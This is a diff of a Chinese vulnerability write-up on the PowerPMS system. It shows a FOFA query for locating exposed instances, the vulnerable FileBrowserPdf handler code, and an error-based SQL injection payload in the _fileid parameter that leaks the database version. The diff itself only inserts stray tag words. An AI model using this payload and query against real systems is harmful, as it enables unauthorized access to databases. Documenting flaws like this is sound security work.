@@ -15,6 +15,8 @@ asset_dir: embedded-base64
 # fofa语法
 
 > app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power\_login\_btn"
+>
+> 数据管理
 
 # 漏洞分析
 
@@ -34,7 +36,13 @@ public class FileBrowserPdf : IHttpHandler
 
 当 \_fileid 参数不为空时，进入BrowserPdfCahe.BrowserPdf
 
-数据管理
+深入探索
+
+开放源代码
+
+开发工具
+
+计算机安全
 
 ```
 public static void BrowserPdf(HttpContext context, string fileId, bool IsFragmentation)
@@ -64,4 +72,4 @@ _fileid=1'and 1<@@VERSION--
 
 通过报错注入成功在响应回显数据库版本信息
 
-网络
+数据管理
